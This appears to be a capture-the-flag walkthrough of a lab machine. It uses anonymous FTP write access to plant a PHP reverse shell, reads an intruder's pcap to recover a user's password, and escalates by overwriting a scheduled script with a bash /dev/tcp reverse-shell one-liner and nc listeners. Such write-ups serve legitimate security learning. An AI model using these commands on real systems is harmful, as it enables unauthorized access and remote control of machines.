No spice here!

Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. 
BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!

/files/ has two files for us to look at:

notice.txt reads:
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! 
Now I dont know who it is, but Maya is looking pretty sus.


important.jpg asks the solemn question of: "everybody asks who's the imposter...but nobody asks hows's the imposter" ;(

There is also the directory for /ftp/ but it appears to be empty.

I tried logging in to the FTP server using anyonymous login to see if there was anything else there:

ftp 10.10.99.213

It looks like we have write access to the /ftp/ directory.
Let's upload a php reverse shell here (I used the one from pentestmonkey)

226 Directory send OK.

Set up a listener: nc -lvnp [whatever port]

Once that is going, go back to /files/ftp/, and you'll see your shell. Click it

--For the recipe question, look for recipe.txt in the / directory--

I found a pcap file under "incidents", and copied it to the ftp folder so I could analyze it:

cp suspicious.pcapng /var/www/html/files/ftp/

It looks like someone else has uploaded a shell to the ftp directory, named shell.php. Following the HTML stream, we see:

WARNING: Failed to daemonise.  This is quite common and not fatal.
Successfully opened reverse shell to 192.168.22.139:4444
ERROR: Shell process terminated

Next, let's check traffic on port 4444 with filter tcp.port == 4444
And look through their activity, which include upgrading the shell with python, tried accessing user lennie's folder, and looking for sudo permissions with sudo -l to which they tried this password and failed: 

[[xx real password is here xx]]

They then looked at /etc/passwd and exited.

Even though they could not get that password to work with sudo, it does turn out to be lennie's password:

su lennie

There are a few notes in his Documents folder:
cat concern.txt
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

cat list.txt
Shoppinglist: Cyberpunk 2077 | Milk | Dog food

cat note.txt
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.

In /scripts/:

planner.sh and startup_list.txt

cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

However, it appears we cannot modify this to do something like a reverse shell. Let's check out what print.sh is:

lennie@startup:/etc$ cat print.sh
#!/bin/bash
echo "Done!"
lennie@startup:/etc$ ls -la print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 print.sh

We can write to this one.

Replace the contents using nano with:
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/[your tun0 address]/[port] 0>&1'

Set up another listener (nc -lvnp [port number])

nc -lvnp 1111
Listening on 0.0.0.0 1111

Congrats!!
